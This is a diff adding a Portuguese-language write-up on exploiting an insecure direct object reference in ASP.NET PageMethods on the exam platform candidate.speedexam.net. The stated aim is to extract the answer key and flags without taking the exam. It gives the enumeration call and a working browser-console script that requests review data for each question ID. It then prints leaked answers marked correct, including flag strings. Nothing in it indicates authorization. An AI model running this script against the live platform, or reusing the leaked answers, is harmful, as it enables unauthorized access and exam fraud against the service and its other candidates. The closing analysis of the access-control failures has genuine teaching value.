@@ -1,0 +1,150 @@
+# VULN: Hacking SpeedExam via ASP.NET PageMethods IDOR
+
+**Alvo:** Plataforma de Exame (`candidate.speedexam.net`)
+**Vulnerabilidade:** Insecure Direct Object Reference (IDOR) & Broken Access Control
+**Vetor:** ASP.NET AJAX PageMethods
+**Impacto:** Extração total do gabarito (Flags) sem realizar o exame.
+
+---
+
+## 1. Reconhecimento (Reconnaissance)
+
+O primeiro passo foi analisar o código fonte da página (`HTML/JS`) e o tráfego de rede (`.HAR`) fornecido.
+
+### Identificação da Tecnologia
+
+Ao inspecionar o código fonte da página do exame, identifiquei imediatamente o uso de **ASP.NET WebForms**. A "assinatura" clara foi a presença do objeto `PageMethods` e chamadas a arquivos `.axd`.
+
+O **ASP.NET AJAX PageMethods** é um recurso antigo que permite que o JavaScript do lado do cliente chame diretamente métodos estáticos C# (`[WebMethod]`) no servidor (code-behind).
+
+### Análise Estática do JavaScript
+
+No arquivo HTML, entre as linhas de script, encontrei a definição da classe `PageMethods`. O desenvolvedor expôs, inadvertidamente, **todas** as funções administrativas e de interação do exame para o navegador do cliente.
+
+Trecho do código analisado:
+
+```javascript
+var PageMethods = function() { ... }
+PageMethods.prototype = {
+    // ... funções de infra ...
+    ExamQuestionAnswerDetails: function(succeededCallback, ...) { ... },
+    AnswerDetails: function(questionid, em, ...) { ... },
+    ReviewAnswerDetails: function(questionid, succeededCallback, ...) { ... },
+    UpdateAnswer: function(questionid, answerid, ...) { ... },
+    // ... dezenas de outras funções ...
+}
+
+```
+
+**Análise das Funções de Interesse:**
+
+1. **`ExamQuestionAnswerDetails`**: O nome sugere que retorna detalhes das perguntas e respostas.
+2. **`ReviewAnswerDetails`**: Sugere a funcionalidade de "revisão" pós-prova, onde o aluno vê o que acertou ou errou.
+3. **`UpdateAnswer`**: Usada para enviar a resposta.
+
+---
+
+## 2. Enumeração (Information Gathering)
+
+Antes de obter as respostas, precisávamos dos IDs das perguntas.
+
+### Teste da Função `ExamQuestionAnswerDetails`
+
+Executei esta função no Console do Navegador (`F12`). Ela não requeria parâmetros (além dos callbacks).
+
+**Comando:**
+
+```javascript
+PageMethods.ExamQuestionAnswerDetails(console.log, console.error);
+
+```
+
+**Resultado:**
+O servidor retornou um JSON contendo uma lista de objetos `Table`.
+
+* **O que obtivemos:** O texto de todas as perguntas e, crucialmente, o **`Question_id`** de cada uma (ex: `6338380`, `6338382`).
+* **O que faltava:** O campo `Answer_id` veio como `null`. O desenvolvedor protegeu (ou não carregou) as respostas nesta visualização específica.
+
+---
+
+## 3. Exploração da Vulnerabilidade (Exploitation)
+
+Aqui reside a falha crítica. O sistema confiava que o usuário só chamaria a função de "Revisão" (`ReviewAnswerDetails`) **após** terminar a prova legitimamente.
+
+No entanto, em APIs Web (mesmo as antigas como WebForms), se não houver verificação de estado no servidor, podemos chamar a função a qualquer momento.
+
+### O Vetor de Ataque: IDOR
+
+Utilizando os `Question_id` obtidos na fase anterior, criei um script para iterar sobre cada ID e perguntar ao servidor: *"Quais são os detalhes da revisão para esta pergunta?"*.
+
+**Script de Ataque (Payload):**
+
+```javascript
+// IDs extraídos da fase de enumeração
+var alvos = [6338380, 6338382, 6338383, 6338384, 6338385, 6338411, 6338412];
+
+alvos.forEach(id => {
+    // Chamada direta ao método de Backend C# exposto
+    PageMethods.ReviewAnswerDetails(id, 
+        (resposta) => console.log("GABARITO ID " + id, resposta), 
+        (erro) => console.error(erro)
+    );
+});
+
+```
+
+### Por que funcionou?
+
+O método `ReviewAnswerDetails` no backend (C#) provavelmente recebe um `questionID`, procura no banco de dados e retorna o objeto Resposta. Ele falhou em verificar:
+
+1. Se o exame do utilizador atual já estava com status "Finalizado".
+2. Se o tempo de revisão estava ativo.
+
+---
+
+## 4. Análise dos Dados (Data Exfiltration)
+
+O servidor respondeu com sucesso para todos os IDs, devolvendo um JSON rico em informações sensíveis.
+
+### Estrutura do JSON Vazado
+
+Para cada ID, recebemos uma lista de opções. A confirmação da resposta correta veio através de um campo booleano explícito.
+
+**Exemplo da Questão 6338384 (Múltipla Escolha):**
+
+```json
+[
+  {
+    "ID": "23701811",
+    "Answer_text": "HelpDesk",
+    "Answer_isCorrect": true   <-- O servidor diz: ESTA É A CORRETA
+  },
+  {
+    "ID": "23701812",
+    "Answer_text": "BackUpAdmins",
+    "Answer_isCorrect": false  <-- O servidor diz: ESTA É ERRADA
+  }
+]
+
+```
+
+**Exemplo da Questão 6338411 (Input de Texto/Flag):**
+O sistema armazena múltiplas variações da string correta para validar o input do usuário (Regex ou String Match). Ao pedir o "Review", o sistema despejou todas as variações aceitas.
+
+```json
+[
+  { "Answer_text": "flag{admin_flag_77cfs_fsrvwin01_desk}", "Answer_isCorrect": true },
+  { "Answer_text": "{admin_flag_77cfs_fsrvwin01_desk}", "Answer_isCorrect": true }
+]
+
+```
+
+---
+
+## 5. Conclusão
+
+A exploração foi possível devido a uma violação clássica dos princípios de segurança da OWASP:
+
+1. **Security by Obscurity (Falha):** Ocultar botões de revisão na interface (UI) não impede que um atacante chame as funções subjacentes se elas estiverem expostas no Javascript.
+2. **Broken Access Control:** O servidor não validou se o usuário tinha permissão para ver a resposta *naquele exato momento* (durante a prova).
+3. **Trusting Client Input:** O servidor aceitou o pedido de `ReviewAnswerDetails` sem validar o contexto do exame.
